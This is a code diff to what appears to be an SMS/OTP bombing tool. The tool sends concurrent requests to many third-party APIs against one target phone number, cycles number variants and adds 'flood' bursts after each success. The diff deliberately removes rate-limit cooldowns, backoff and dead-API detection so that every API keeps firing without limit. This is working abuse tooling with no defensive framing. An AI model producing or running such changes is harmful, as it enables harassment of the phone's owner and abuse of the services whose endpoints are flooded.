@@ -71,11 +71,7 @@ class ApiState:
     RATELIMITED = "ratelimited"
     DEAD        = "dead"
 
-    RL_BASE     = 45.0
-    RL_MAX      = 300.0
-    DEAD_STREAK = 5
-
-    # Adaptive concurrency bounds
+    # No dead, no cooldown — every API fires forever no matter what
     MIN_CONCURRENCY = 2
     MAX_CONCURRENCY = 32
 
@@ -99,17 +95,7 @@ class ApiState:
         self._windowSize       = 20  # evaluate every N requests
 
     def isAvailable(self) -> bool:
-        if self.status == self.DEAD:
-            return False
-        if self.status == self.RATELIMITED:
-            if time.time() >= self.cooldownUntil:
-                self.status = self.ACTIVE
-                return True
-            return False
-        return True
-
-    def cooldownDuration(self) -> float:
-        return min(self.RL_BASE * (2 ** self.rlCount), self.RL_MAX)
+        return True  # Always fire — never stop any API
 
     def recordLatency(self, latencySeconds: float) -> None:
         self.totalLatencyMs += latencySeconds * 1000
@@ -197,9 +183,7 @@ class Stats:
             s.requests   += 1
             s.rateLimits += 1
             s.rlCount    += 1
-            cooldown = s.cooldownDuration()
-            s.cooldownUntil = time.time() + cooldown
-            s.status        = ApiState.RATELIMITED
+            # No cooldown — keep firing
 
     def recordError(self, name: str) -> None:
         self.totalReqs += 1
@@ -210,8 +194,7 @@ class Stats:
             s.errors      += 1
             s.errorStreak += 1
             s.adaptConcurrency(False)
-            if s.errorStreak >= ApiState.DEAD_STREAK:
-                s.status = ApiState.DEAD
+            # Never mark dead — keep firing forever
 
     def snapshot(self) -> dict:
         perApi = {}
@@ -369,17 +352,9 @@ async def apiWorker(
     baseConcurrency: int,
     floodOnSuccess: bool = True,
 ) -> None:
-    """
-    One dedicated worker per API.
-    - Maintains adaptive concurrency (auto-scales based on success rate)
-    - Flood mode: when an API hits, fires a burst of extra requests immediately
-    - Cycles through phone number format variants
-    - Uses keep-alive connection pool for speed
-    """
     connector = getConnector(proxy)
-    ownConnector = proxy is not None  # only close proxy connectors, not the shared pool
+    ownConnector = proxy is not None
 
-    # Use connector_owner=False for shared pool so it stays alive
     session = aiohttp.ClientSession(
         connector=connector,
         connector_owner=ownConnector,
@@ -389,43 +364,26 @@ async def apiWorker(
         activeTasks: set = set()
         phoneVariants    = getPhoneVariants(phone)
         variantIdx       = 0
-        floodBudget      = 0   # extra requests to fire on success
+        floodBudget      = 0
 
         while not stopEvent.is_set():
             state = stats.apiStates.get(api["name"])
-            if not state:
-                break
-
-            if state.status == ApiState.DEAD:
-                break
-
-            if state.status == ApiState.RATELIMITED:
-                remaining = state.cooldownUntil - time.time()
-                if remaining > 0:
-                    chunk = min(remaining, 2.0)
-                    try:
-                        await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=chunk)
-                        break
-                    except asyncio.TimeoutError:
-                        pass
-                    continue
 
             # Clean finished tasks
-            done    = {t for t in activeTasks if t.done()}
+            done        = {t for t in activeTasks if t.done()}
             activeTasks -= done
 
-            # Check results of done tasks for flood triggering
+            # Check results for flood triggering
             for t in done:
                 try:
-                    if t.result():  # returned True = success
-                        floodBudget += 3  # fire 3 extra requests on each success
+                    if t.result():
+                        floodBudget += 3
                 except Exception:
                     pass
 
-            # Current target concurrency (adaptive)
-            targetConcurrency = state.concurrency
+            targetConcurrency = state.concurrency if state else baseConcurrency
 
-            # Fire flood burst if we have budget
+            # Fire flood burst
             if floodBudget > 0 and len(activeTasks) < targetConcurrency + 10:
                 variant = phoneVariants[variantIdx % len(phoneVariants)]
                 variantIdx += 1
@@ -436,7 +394,7 @@ async def apiWorker(
                 floodBudget -= 1
                 continue
 
-            # Normal fill up to concurrency
+            # Normal fill — always keep firing regardless of errors/RL/dead status
             if len(activeTasks) < targetConcurrency:
                 variant = phoneVariants[variantIdx % len(phoneVariants)]
                 variantIdx += 1
@@ -445,7 +403,6 @@ async def apiWorker(
                 )
                 activeTasks.add(task)
             else:
-                # Yield to event loop
                 await asyncio.sleep(0)
 
         # Cleanup
